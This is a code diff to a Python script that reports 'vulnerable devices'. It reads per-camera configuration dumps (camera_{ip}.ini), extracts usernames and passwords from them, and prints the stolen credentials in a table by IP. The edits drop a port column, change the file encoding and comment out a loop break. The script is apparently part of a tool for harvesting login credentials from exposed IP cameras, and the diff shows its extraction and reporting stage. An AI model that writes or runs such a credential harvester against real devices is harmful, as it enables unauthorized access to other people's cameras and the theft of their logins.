@@ -98,7 +98,7 @@ print(f'Devices tested: {len(list(set(ips)))}\nVulnerable devices: {taro2}\n')
 
 
 
-th = ['IP', 'PORT', 'USERNAME', 'PASSWORD']
+th = ['IP', 'USERNAME', 'PASSWORD']
 td = []
 
 
@@ -121,7 +121,7 @@ if len(num_of_vulnerable) >= int('1'):
    try:
     user = None
     password = None
-    file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')
+    file = open(f'camera_{ipi}.ini', 'r', encoding='ANSI')
 
     try:
      data = file.read().replace('\x00', ' ')
@@ -139,14 +139,13 @@ if len(num_of_vulnerable) >= int('1'):
        #print(f'\nSuccess: {ipi} | {words[i]}:{words[i+1]}')
        #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
        td.append(ipi)
-       td.append('81')
        td.append(words[i])
        td.append(words[i+1])
        #asq.append(f'IP: {Fore.CYAN + ipi + Fore.WHITE}\nUsername: {words[i]}\nPassword:{words[i+1]}\n')
        raz += 1
        #print(asq)
        bar.next()
-       break
+       #break
       #raz += 1
       #tree.insert('', tk.END, values=(ipi, user, password))
      except Exception as e:
@@ -172,6 +171,6 @@ if len(num_of_vulnerable) >= int('1'):
  while td_data:
     table.add_row(td_data[:columns])
     td_data = td_data[columns:]
- print(table, '\n')
+ print(table)
 else:
  print("No vulnerable devices was found!\n")
